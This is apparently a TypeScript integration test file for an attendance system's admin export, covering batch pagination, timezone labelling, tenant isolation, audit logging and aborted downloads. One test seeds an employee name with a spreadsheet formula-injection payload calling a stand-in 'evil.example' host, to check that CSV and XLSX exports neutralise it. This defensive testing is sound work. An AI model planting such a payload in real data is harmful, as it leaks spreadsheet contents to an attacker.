import { randomUUID } from 'node:crypto';
import http, { type Server } from 'node:http';
import { AttendanceStatus, Role, type ReportSummary } from '@wasel/contracts';
import excel from 'exceljs';
import { afterAll, beforeAll, beforeEach, describe, expect, it } from 'vitest';
import { EXPORT_BATCH_SIZE } from '../../src/modules/admin/admin.constants.js';
import { AdminModule } from '../../src/modules/admin/admin.module.js';
import { TIMEZONE_CHANGED_NOTE } from '../../src/modules/admin/export/export-columns.js';
import { AuthModule } from '../../src/modules/auth/auth.module.js';
import { seedAttendanceRecord, seedSite } from '../fixtures/admin-fixtures.js';
import {
  createTestApp,
  createUser,
  createUserAndLogin,
  type AuthenticatedActor,
  type TestApp,
} from '../support/index.js';

/**
 * The attendance sheet — the buyer's headline feature, and until this file the
 * only part of the admin module no test had ever produced or read.
 *
 * That gap is why an XLSX export could render an entire year into memory without
 * ever consulting the socket, and why `keysetAfter` — the cursor that is the only
 * thing standing between a payroll extract and duplicated or dropped rows — was
 * uncovered. Every export test here therefore crosses **more than one batch**:
 * a suite whose fixtures all fit in the first 500 rows exercises none of the
 * pagination it exists to protect.
 */

const RIYADH = 'Asia/Riyadh';
const NEW_YORK = 'America/New_York';
/** 05:15 UTC is 08:15 on the Riyadh wall clock — the value the sheet must show. */
const CHECK_IN_UTC = 'T05:15:00.000Z';
const CHECK_OUT_UTC = 'T14:30:00.000Z';
const WALL_CLOCK_IN = '08:15';
const WALL_CLOCK_OUT = '17:30';

/** Enough rows to cross the 500-row batch boundary twice over. */
const CROWD = 40;
const DAYS = 30;
const TOTAL_ROWS = CROWD * DAYS;

interface Sheet {
  header: string[];
  rows: string[][];
}

/** `YYYY-MM-DD` for day `index` of March 2026, wrapping into April. */
function workDay(index: number): string {
  const date = new Date(Date.UTC(2026, 2, 1 + index));
  return date.toISOString().slice(0, 10);
}

function parseCsv(text: string): Sheet {
  const body = text.startsWith('﻿') ? text.slice(1) : text;
  const lines = body.split('\r\n').filter((line) => line !== '');
  const split = (line: string): string[] => {
    const cells: string[] = [];
    let cell = '';
    let quoted = false;
    for (let i = 0; i < line.length; i += 1) {
      const char = line[i];
      if (quoted) {
        if (char === '"' && line[i + 1] === '"') {
          cell += '"';
          i += 1;
        } else if (char === '"') quoted = false;
        else cell += char;
      } else if (char === '"') quoted = true;
      else if (char === ',') {
        cells.push(cell);
        cell = '';
      } else cell += char;
    }
    cells.push(cell);
    return cells;
  };
  return { header: split(lines[0] ?? ''), rows: lines.slice(1).map(split) };
}

/** The workbook as ExcelJS reads it back — a real parse, not a byte comparison. */
async function loadWorkbook(buffer: Buffer): Promise<excel.Workbook> {
  // `PK\x03\x04`: proof the response is a zip container before anything tries to
  // interpret it, so a corrupt download fails with something legible.
  expect(buffer.subarray(0, 4).toString('latin1')).toBe('PK');
  const workbook = new excel.Workbook();
  await workbook.xlsx.load(buffer);
  return workbook;
}

function cellText(value: excel.CellValue): string {
  if (value === null || value === undefined) return '';
  if (value instanceof Date) return value.toISOString();
  if (typeof value === 'number' || typeof value === 'boolean') return String(value);
  if (typeof value === 'string') return value;
  // A rich-text or hyperlink cell; the export writes neither, but reading one as
  // "[object Object]" would make a failure unreadable.
  return 'text' in value ? String(value.text) : JSON.stringify(value);
}

/**
 * Every `Summary` row as a `label | value` pair, in sheet order.
 *
 * {@link summaryOf} is a map, so it silently collapses two rows that share a
 * label — which the timezone-change list does whenever two moves land in the same
 * wall-clock minute.
 */
function summaryPairs(workbook: excel.Workbook): string[] {
  const sheet = workbook.getWorksheet('Summary');
  expect(sheet).toBeDefined();
  const pairs: string[] = [];
  sheet?.eachRow((row) => {
    pairs.push(`${cellText(row.getCell(1).value)} | ${cellText(row.getCell(2).value)}`);
  });
  return pairs;
}

/** `Summary` sheet as a label → value map. */
function summaryOf(workbook: excel.Workbook): Map<string, string> {
  const sheet = workbook.getWorksheet('Summary');
  expect(sheet).toBeDefined();
  const entries = new Map<string, string>();
  sheet?.eachRow((row) => {
    const label = cellText(row.getCell(1).value);
    if (label !== '') entries.set(label, cellText(row.getCell(2).value));
  });
  return entries;
}

describe('admin attendance report and export', () => {
  let ctx: TestApp;
  let admin: AuthenticatedActor;
  let siteId: string;

  beforeAll(async () => {
    ctx = await createTestApp({
      imports: [AuthModule, AdminModule],
      env: { RATE_LIMIT_MAX: '100000' },
    });
  });
  afterAll(async () => {
    await ctx.close();
  });
  beforeEach(async () => {
    await ctx.truncate();
    admin = await createUserAndLogin(ctx, {
      role: Role.ADMIN,
      organization: { timezone: RIYADH },
    });
    siteId = (await seedSite(ctx, admin.organization.id, { name: 'Head Office' })).id;
  });

  /**
   * `CROWD` employees × `DAYS` days, written in bulk.
   *
   * Several employees share each `workDate` on purpose: the export orders by
   * `(workDate, userId)`, so a fixture with one row per day would let a cursor
   * that ignored the `userId` tie-break pass. Here a batch boundary lands in the
   * middle of a day, which is exactly where a broken keyset drops or repeats a
   * row.
   */
  async function seedCrowd(): Promise<void> {
    const organizationId = admin.organization.id;
    const passwordHash = 'not-a-real-hash-these-users-never-sign-in';
    const users = Array.from({ length: CROWD }, (_, i) => ({
      id: randomUUID(),
      organizationId,
      email: `crowd-${String(i).padStart(3, '0')}@wasel.test`,
      passwordHash,
      fullName: `Crowd Member ${String(i).padStart(3, '0')}`,
      employeeCode: `CRW-${String(i).padStart(3, '0')}`,
      role: Role.MEMBER,
    }));
    await ctx.prisma.user.createMany({ data: users });

    const records = users.flatMap((user) =>
      Array.from({ length: DAYS }, (_, day) => {
        const date = workDay(day);
        return {
          organizationId,
          userId: user.id,
          workDate: new Date(`${date}T00:00:00.000Z`),
          checkInAt: new Date(`${date}${CHECK_IN_UTC}`),
          checkInSiteId: siteId,
          checkInLatitude: 24.7136,
          checkInLongitude: 46.6753,
          checkInAccuracyM: 12,
          checkInDistanceM: 20,
          checkOutAt: new Date(`${date}${CHECK_OUT_UTC}`),
          checkOutSiteId: siteId,
          checkOutLatitude: 24.7136,
          checkOutLongitude: 46.6753,
          checkOutAccuracyM: 12,
          checkOutDistanceM: 20,
          status: AttendanceStatus.PRESENT,
          workedMinutes: 555,
          lateMinutes: 0,
        };
      }),
    );
    await ctx.prisma.attendanceRecord.createMany({ data: records });
  }

  const fullRange = `from=${workDay(0)}&to=${workDay(DAYS - 1)}`;

  async function downloadCsv(query: string): Promise<Sheet> {
    const response = await admin.get(`/admin/reports/export?${query}&format=csv`).expect(200);
    return parseCsv(response.text);
  }

  async function downloadXlsx(query: string): Promise<excel.Workbook> {
    const response = await admin
      .get(`/admin/reports/export?${query}&format=xlsx`)
      .responseType('blob')
      .expect(200);
    return loadWorkbook(response.body as Buffer);
  }

  describe('GET /admin/reports/export', () => {
    it('defaults to xlsx and names the file after the tenant and the range', async () => {
      const response = await admin
        .get(`/admin/reports/export?${fullRange}`)
        .responseType('blob')
        .expect(200);

      expect(response.headers['content-type']).toContain('spreadsheetml.sheet');
      expect(response.headers['content-disposition']).toContain(
        `attendance-${workDay(0)}_to_${workDay(DAYS - 1)}.xlsx`,
      );
      expect(response.headers['cache-control']).toBe('no-store');
      await loadWorkbook(response.body as Buffer);
    });

    it('emits every row exactly once across batch boundaries', async () => {
      await seedCrowd();
      expect(TOTAL_ROWS).toBeGreaterThan(EXPORT_BATCH_SIZE * 2);

      const csv = await downloadCsv(fullRange);
      expect(csv.rows).toHaveLength(TOTAL_ROWS);

      // `(workDate, employeeCode)` is unique per row, so a duplicated or dropped
      // cursor position shows up here as a count mismatch rather than as a
      // plausible-looking sheet.
      const keys = csv.rows.map((row) => `${row[0]}/${row[1]}`);
      expect(new Set(keys).size).toBe(TOTAL_ROWS);

      const expected = await ctx.prisma.attendanceRecord.findMany({
        where: { organizationId: admin.organization.id },
        select: { workDate: true, user: { select: { employeeCode: true } } },
      });
      expect(new Set(keys)).toEqual(
        new Set(
          expected.map(
            (row) => `${row.workDate.toISOString().slice(0, 10)}/${row.user.employeeCode ?? ''}`,
          ),
        ),
      );

      // Ordered oldest first, and non-decreasing straight through the 500/501 and
      // 1000/1001 boundaries where a keyset bug lives.
      const dates = csv.rows.map((row) => row[0] ?? '');
      expect([...dates].sort((a, b) => a.localeCompare(b))).toEqual(dates);
      for (const boundary of [EXPORT_BATCH_SIZE, EXPORT_BATCH_SIZE * 2]) {
        expect(keys[boundary - 1]).not.toBe(keys[boundary]);
      }
    });

    it('writes the same rows into the workbook, and Excel can read them back', async () => {
      await seedCrowd();

      const workbook = await downloadXlsx(fullRange);
      const sheet = workbook.getWorksheet('Attendance');
      expect(sheet).toBeDefined();
      // The header plus one row per record, and not one more.
      expect(sheet?.rowCount).toBe(TOTAL_ROWS + 1);

      const keys = new Set<string>();
      sheet?.eachRow((row, number) => {
        if (number === 1) return;
        keys.add(`${cellText(row.getCell(1).value)}/${cellText(row.getCell(2).value)}`);
      });
      expect(keys.size).toBe(TOTAL_ROWS);
    });

    it("states the organization's timezone in the header of every zoned column", async () => {
      await seedCrowd();

      const csv = await downloadCsv(fullRange);
      expect(csv.header).toEqual([
        'Work date',
        'Employee code',
        'Full name',
        'Email',
        `Check-in (${RIYADH})`,
        'Check-in site',
        `Check-out (${RIYADH})`,
        'Check-out site',
        'Status',
        'Worked minutes',
        'Late minutes',
      ]);

      const workbook = await downloadXlsx(fullRange);
      const header = workbook.getWorksheet('Attendance')?.getRow(1);
      expect(cellText(header?.getCell(5).value)).toBe(`Check-in (${RIYADH})`);
      expect(cellText(header?.getCell(7).value)).toBe(`Check-out (${RIYADH})`);
    });

    it('renders times as the local wall clock in both formats', async () => {
      const employee = await createUser(ctx, {
        organizationId: admin.organization.id,
        fullName: 'Wall Clock',
        employeeCode: 'WC-1',
      });
      const day = workDay(0);
      await seedAttendanceRecord(ctx, {
        organizationId: admin.organization.id,
        userId: employee.user.id,
        siteId,
        workDate: day,
        checkInAt: new Date(`${day}${CHECK_IN_UTC}`),
        checkOutAt: new Date(`${day}${CHECK_OUT_UTC}`),
      });

      const csv = await downloadCsv(`from=${day}&to=${day}`);
      expect(csv.rows[0]?.[4]).toBe(`${day} ${WALL_CLOCK_IN}`);
      expect(csv.rows[0]?.[6]).toBe(`${day} ${WALL_CLOCK_OUT}`);

      const workbook = await downloadXlsx(`from=${day}&to=${day}`);
      const row = workbook.getWorksheet('Attendance')?.getRow(2);
      // A real date cell — so Excel sorts and subtracts it — whose UTC fields
      // carry the Riyadh wall clock, because xlsx has nowhere to record a zone.
      expect(row?.getCell(5).value).toBeInstanceOf(Date);
      expect((row?.getCell(5).value as Date).toISOString()).toBe(`${day}T${WALL_CLOCK_IN}:00.000Z`);
      expect((row?.getCell(7).value as Date).toISOString()).toBe(
        `${day}T${WALL_CLOCK_OUT}:00.000Z`,
      );
      expect(row?.getCell(1).value).toBeInstanceOf(Date);
    });

    it('totals the Summary sheet over exactly the rows the file contains', async () => {
      await seedCrowd();

      const workbook = await downloadXlsx(fullRange);
      const summary = summaryOf(workbook);

      expect(summary.get('Records')).toBe(String(TOTAL_ROWS));
      expect(summary.get('Distinct employees')).toBe(String(CROWD));
      expect(summary.get('Present')).toBe(String(TOTAL_ROWS));
      expect(summary.get('Total worked minutes')).toBe(String(TOTAL_ROWS * 555));
      expect(summary.get('Timezone')).toBe(RIYADH);
      expect(summary.get('Organization')).toBe(admin.organization.name);

      // The same numbers the JSON report gives, so the sheet and the screen never
      // disagree about somebody's month.
      const report = await admin.get(`/admin/reports/attendance?${fullRange}`).expect(200);
      const totals = report.body.summary as ReportSummary;
      expect(totals.totalRecords).toBe(TOTAL_ROWS);
      expect(totals.totalWorkedMinutes).toBe(TOTAL_ROWS * 555);
    });

    it('produces a valid one-row file for an empty range', async () => {
      const csv = await downloadCsv('from=2026-01-01&to=2026-01-31');
      expect(csv.rows).toHaveLength(0);
      expect(csv.header[0]).toBe('Work date');

      const workbook = await downloadXlsx('from=2026-01-01&to=2026-01-31');
      expect(workbook.getWorksheet('Attendance')?.rowCount).toBe(1);
      expect(summaryOf(workbook).get('Records')).toBe('0');
    });

    it('neutralises a formula in an employee name in both formats', async () => {
      const hostile = '=HYPERLINK("http://evil.example/?"&A1,"Click")';
      const employee = await createUser(ctx, {
        organizationId: admin.organization.id,
        fullName: hostile,
        employeeCode: '-2+3',
      });
      const day = workDay(0);
      await seedAttendanceRecord(ctx, {
        organizationId: admin.organization.id,
        userId: employee.user.id,
        siteId,
        workDate: day,
      });

      const csv = await downloadCsv(`from=${day}&to=${day}`);
      expect(csv.rows[0]?.[1]).toBe("'-2+3");
      expect(csv.rows[0]?.[2]).toBe(`'${hostile}`);

      // The xlsx used to disagree with the csv about the very same cell, which
      // re-arms the payload as soon as the recipient re-exports the sheet.
      const workbook = await downloadXlsx(`from=${day}&to=${day}`);
      const row = workbook.getWorksheet('Attendance')?.getRow(2);
      expect(cellText(row?.getCell(2).value)).toBe("'-2+3");
      expect(cellText(row?.getCell(3).value)).toBe(`'${hostile}`);
    });

    it("never exports another tenant's rows", async () => {
      await seedCrowd();
      const other = await createUserAndLogin(ctx, {
        role: Role.ADMIN,
        organization: { timezone: RIYADH },
      });

      const response = await other.get(`/admin/reports/export?${fullRange}&format=csv`).expect(200);
      expect(parseCsv(response.text).rows).toHaveLength(0);
    });

    it('records the intent and the completion of a download', async () => {
      // Seeded, so the download takes long enough for the two rows to carry
      // distinguishable timestamps. `AuditLog.createdAt` is millisecond-precision
      // and nothing else orders the table, so an empty export writes its intent
      // and its completion inside one millisecond and the two come back from
      // Postgres in whichever order it likes — an ordering assertion made against
      // that is a coin toss, not a test.
      await seedCrowd();
      await downloadCsv(fullRange);

      const rows = await waitForAudit(ctx, admin.organization.id, 'admin.report.exported');
      const started = rows.find((row) => row.action === 'admin.report.export_started');
      const finished = rows.find((row) => row.action === 'admin.report.exported');
      expect(started).toBeDefined();
      expect(finished).toBeDefined();
      expect(finished?.metadata).toMatchObject({ rows: TOTAL_ROWS });

      // The intent is written first, so a download that dies part-way still
      // leaves evidence that somebody asked for the range.
      expect(started?.createdAt.getTime()).toBeLessThan(finished?.createdAt.getTime() ?? 0);
    });

    it('rejects an inverted range, an over-long range and a non-admin', async () => {
      await admin
        .get(`/admin/reports/export?from=${workDay(5)}&to=${workDay(0)}`)
        .expect(400)
        .expect((res) => expect(res.body.code).toBe('VALIDATION_FAILED'));
      await admin.get('/admin/reports/export?from=2020-01-01&to=2026-01-01').expect(400);

      const member = await createUserAndLogin(ctx, {
        organizationId: admin.organization.id,
        role: Role.MEMBER,
      });
      await member.get(`/admin/reports/export?${fullRange}`).expect(403);
    });
  });

  /**
   * The one thing an export cannot fix, and must therefore say out loud.
   *
   * `workDate` is frozen at punch time and deliberately never restated, but every
   * *instant* in the sheet is rendered in the tenant's **current** zone. After a
   * move the two disagree, and a March sheet re-exported in June shows a
   * check-in that falls on the day before its own work date. The file is not
   * corrupt and nothing was rewritten — but a payroll reader comparing it against
   * the copy they were paid from has to be told, because the alternative is a
   * sheet that looks perfectly consistent and contradicts itself.
   */
  describe('after the organization changes its timezone', () => {
    /** 22:30 UTC on the 1st is 01:30 on the 2nd in Riyadh, and 17:30 on the 1st in New York. */
    const STRADDLING_INSTANT = new Date('2026-03-01T22:30:00.000Z');
    const WORK_DATE = '2026-03-02';
    const RANGE = `from=2026-03-01&to=2026-03-31`;

    async function seedStraddlingRecord(): Promise<void> {
      const employee = await createUser(ctx, {
        organizationId: admin.organization.id,
        fullName: 'Night Shift',
        employeeCode: 'NS-1',
      });
      await seedAttendanceRecord(ctx, {
        organizationId: admin.organization.id,
        userId: employee.user.id,
        siteId,
        workDate: WORK_DATE,
        checkInAt: STRADDLING_INSTANT,
        checkOutAt: null,
      });
    }

    it('leaves an untouched tenant’s file exactly as it was', async () => {
      await seedStraddlingRecord();

      const csv = await downloadCsv(RANGE);
      expect(csv.header[4]).toBe(`Check-in (${RIYADH})`);
      expect(csv.rows[0]?.[0]).toBe(WORK_DATE);
      expect(csv.rows[0]?.[4]).toBe(`${WORK_DATE} 01:30`);

      // No notice block on a workbook that has nothing to warn about.
      expect(summaryOf(await downloadXlsx(RANGE)).has('Timezone changed')).toBe(false);
    });

    it('warns in the header of every zoned column, in both formats', async () => {
      await seedStraddlingRecord();
      await admin.patch('/admin/organization').send({ timezone: NEW_YORK }).expect(200);

      const csv = await downloadCsv(RANGE);
      // The contradiction itself: the work date is untouched, and the instant is
      // now rendered on the previous calendar day.
      expect(csv.rows[0]?.[0]).toBe(WORK_DATE);
      expect(csv.rows[0]?.[4]).toBe('2026-03-01 17:30');

      // The CSV is a bare rectangle by design, so the column title is the only
      // place in it a sentence can go without breaking every parser.
      expect(csv.header[4]).toBe(`Check-in (${NEW_YORK}; ${TIMEZONE_CHANGED_NOTE})`);
      expect(csv.header[6]).toBe(`Check-out (${NEW_YORK}; ${TIMEZONE_CHANGED_NOTE})`);
      expect(csv.header[0]).toBe('Work date');
      expect(csv.rows[0]).toHaveLength(csv.header.length);

      // Both formats say the same thing about the same cell; a CSV and an XLSX of
      // one range that disagree is a payroll dispute with two answers.
      const workbook = await downloadXlsx(RANGE);
      const header = workbook.getWorksheet('Attendance')?.getRow(1);
      expect(cellText(header?.getCell(5).value)).toBe(
        `Check-in (${NEW_YORK}; ${TIMEZONE_CHANGED_NOTE})`,
      );
    });

    it('spells out the change on the summary sheet, where there is room for it', async () => {
      await seedStraddlingRecord();
      await admin.patch('/admin/organization').send({ timezone: NEW_YORK }).expect(200);

      const summary = summaryOf(await downloadXlsx(RANGE));
      expect(summary.get('Timezone')).toBe(NEW_YORK);
      expect(summary.get('Timezone changed')).toContain('1 change');

      // Which way, and when — the two facts a header has no room for and a reader
      // holding two disagreeing exports needs.
      expect([...summary.values()]).toContain(`${RIYADH} → ${NEW_YORK}`);
      expect([...summary.keys()].some((key) => /^\d{4}-\d{2}-\d{2} \d{2}:\d{2} \(/.test(key))).toBe(
        true,
      );
      const explanation = summary.get('What this means') ?? '';
      expect(explanation).toContain(NEW_YORK);
      expect(explanation).toContain('never restated');
    });

    it('lists every move when the zone was changed more than once', async () => {
      await seedStraddlingRecord();
      await admin.patch('/admin/organization').send({ timezone: NEW_YORK }).expect(200);
      await admin.patch('/admin/organization').send({ timezone: 'Europe/Berlin' }).expect(200);

      const workbook = await downloadXlsx(RANGE);
      expect(summaryOf(workbook).get('Timezone changed')).toContain('2 changes');

      // Both hops, in order: a reader has to be able to follow the zone from the
      // one the records were made in to the one they are being rendered in.
      const pairs = summaryPairs(workbook);
      const moves = pairs.filter((pair) => pair.includes('→'));
      expect(moves).toHaveLength(2);
      expect(moves[0]).toContain(`${RIYADH} → ${NEW_YORK}`);
      expect(moves[1]).toContain(`${NEW_YORK} → Europe/Berlin`);
    });

    it('stays quiet about a change that predates the exported range', async () => {
      // Every row in the range was written under the zone the file renders in, so
      // there is nothing to warn about — and a warning that fires on every export
      // is one nobody reads.
      await seedStraddlingRecord();
      await ctx.prisma.auditLog.create({
        data: {
          organizationId: admin.organization.id,
          actorId: admin.user.id,
          action: 'admin.organization.timezone_changed',
          entityType: 'Organization',
          entityId: admin.organization.id,
          metadata: { previousTimezone: 'UTC', timezone: RIYADH },
          createdAt: new Date('2026-01-15T09:00:00.000Z'),
        },
      });

      const csv = await downloadCsv(RANGE);
      expect(csv.header[4]).toBe(`Check-in (${RIYADH})`);
      expect(summaryOf(await downloadXlsx(RANGE)).has('Timezone changed')).toBe(false);
    });

    it('ignores a timeline row it cannot read rather than failing the download', async () => {
      await seedStraddlingRecord();
      await ctx.prisma.auditLog.create({
        data: {
          organizationId: admin.organization.id,
          actorId: admin.user.id,
          action: 'admin.organization.timezone_changed',
          entityType: 'Organization',
          entityId: admin.organization.id,
          metadata: { somethingElse: true },
        },
      });

      const csv = await downloadCsv(RANGE);
      expect(csv.header[4]).toBe(`Check-in (${RIYADH})`);
      expect(csv.rows).toHaveLength(1);
    });

    it("does not read another tenant's timezone history", async () => {
      await seedStraddlingRecord();
      const other = await createUserAndLogin(ctx, {
        role: Role.ADMIN,
        organization: { timezone: RIYADH },
      });
      await other.patch('/admin/organization').send({ timezone: NEW_YORK }).expect(200);

      const csv = await downloadCsv(RANGE);
      expect(csv.header[4]).toBe(`Check-in (${RIYADH})`);
    });
  });

  describe('an abandoned download', () => {
    it('settles the handler, logs the abort and audits it', async () => {
      await seedCrowd();
      ctx.logs.clear();

      const aborted = await abortMidDownload(
        ctx,
        admin.accessToken,
        `/api/v1/admin/reports/export?${fullRange}&format=csv`,
      );
      expect(aborted).toBeGreaterThan(0);

      // Before the socket's `close` was wired into the drain wait, this row never
      // arrived: the handler stayed suspended on a `drain` a destroyed socket can
      // never emit, so the `catch` never ran, nothing was logged, and the promise
      // chain — generator, batch, sink and response — leaked for the life of the
      // process.
      const rows = await waitForAudit(ctx, admin.organization.id, 'admin.report.export_failed');
      const failure = rows.find((row) => row.action === 'admin.report.export_failed');
      expect(failure?.metadata).toMatchObject({ reason: 'client_disconnected', format: 'csv' });

      const logs = await ctx.logs.waitFor((log) =>
        String(log.msg).includes('abandoned by the client'),
      );
      expect(logs.some((log) => String(log.msg).includes('abandoned by the client'))).toBe(true);
    });
  });
});

interface AuditRow {
  action: string;
  metadata: unknown;
  createdAt: Date;
}

/**
 * Waits for `action` to appear in the tenant's audit log.
 *
 * Polled rather than awaited: the export owns the response and ends it before the
 * audit write resolves, so the row lands shortly after the client sees the last
 * byte. A bounded wait fails as a timeout with a useful message rather than as a
 * flake.
 */
async function waitForAudit(
  ctx: TestApp,
  organizationId: string,
  action: string,
): Promise<AuditRow[]> {
  for (let attempt = 0; attempt < 100; attempt += 1) {
    const rows = await ctx.prisma.auditLog.findMany({
      where: { organizationId },
      orderBy: { createdAt: 'asc' },
      select: { action: true, metadata: true, createdAt: true },
    });
    if (rows.some((row) => row.action === action)) return rows;
    await new Promise((resolve) => setTimeout(resolve, 50));
  }
  throw new Error(`Timed out waiting for the audit action "${action}"`);
}

/**
 * Starts a real download, reads a little of it and destroys the socket.
 *
 * Supertest always consumes a response to completion, which is precisely the case
 * that never reproduced this bug, so the request is made against the application's
 * own listening server with `node:http`.
 */
async function abortMidDownload(ctx: TestApp, token: string, path: string): Promise<number> {
  const server = ctx.app.getHttpServer() as Server;
  if (!server.listening) await new Promise<void>((resolve) => server.listen(0, resolve));
  const address = server.address();
  if (address === null || typeof address === 'string') throw new Error('server is not listening');

  return await new Promise<number>((resolve, reject) => {
    const request = http.get(
      {
        port: address.port,
        path,
        headers: { authorization: `Bearer ${token}`, 'accept-encoding': 'identity' },
      },
      (response) => {
        let received = 0;
        response.on('data', (chunk: Buffer) => {
          received += chunk.length;
          if (received > 2048) {
            request.destroy();
            resolve(received);
          }
        });
        response.on('end', () => resolve(received));
      },
    );
    request.on('error', () => resolve(0));
    setTimeout(() => reject(new Error('the download never produced any bytes')), 15_000).unref();
  });
}
